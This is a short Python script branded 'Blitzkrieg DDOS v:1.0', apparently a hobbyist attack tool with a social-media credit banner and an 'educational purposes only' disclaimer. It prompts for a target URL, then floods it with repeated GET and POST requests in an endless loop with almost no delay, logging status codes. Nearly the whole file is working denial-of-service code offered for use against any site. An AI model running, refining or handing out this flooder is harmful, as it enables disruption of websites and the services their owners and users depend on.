import time
import os
import requests

# kode warna
COLORS = {
    "black": "\033[0;30m",
    "red": "\033[0;31m",
    "green": "\033[0;32m",
    "yellow": "\033[0;33m",
    "blue": "\033[0;34m",
    "magenta": "\033[0;35m",
    "cyan": "\033[0;36m",
    "white": "\033[0;37m",
    "nocolor": "\033[0m",
    "bright_black": "\033[0;90m",
    "bright_red": "\033[0;91m",
    "bright_green": "\033[0;92m",
    "bright_yellow": "\033[0;93m",
    "bright_blue": "\033[0;94m",
    "bright_magenta": "\033[0;95m",
    "bright_cyan": "\033[0;96m",
    "bright_white": "\033[0;97m"
}

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_terminal()
    print(f"{COLORS['bright_magenta']}==================================================")
    print("=                                                =")
    print(f"=              {COLORS['red']}Blitzkrieg DDOS v:1.0             {COLORS['bright_magenta']}=")
    print("=                                                =")
    print(f"= {COLORS['red']}YT: Johar Aja         IG: johar_aja_09         {COLORS['bright_magenta']}=")
    print("=                                                =")
    print("==================================================")
    print(f"{COLORS['yellow']}!!just for educational purposes only!! ")
    print(f"{COLORS['bright_magenta']}")

def send_requests(url):
    i = 0
    while True:
        try:
            response = requests.post(url, timeout=1)
            req1 = requests.get(url, timeout=1)
            req2 = requests.get(url, timeout=1)
            req3 = requests.post(url, timeout=1)
            req4 = requests.post(url, timeout=1)
            print(f"{COLORS['red']}[+] Sending to {COLORS['green']}{url}{COLORS['red']} iteration {COLORS['green']}{i}{COLORS['red']} | GET {req1.status_code} | POST {req3.status_code}")
            i += 1
        except requests.exceptions.RequestException as e:
            print(f"{COLORS['red']}Error: {e}{COLORS['nocolor']}")
        time.sleep(0.001)

def main():
    print_banner()
    url = input("URL: ")
    send_requests(url)

if __name__ == "__main__":
    main()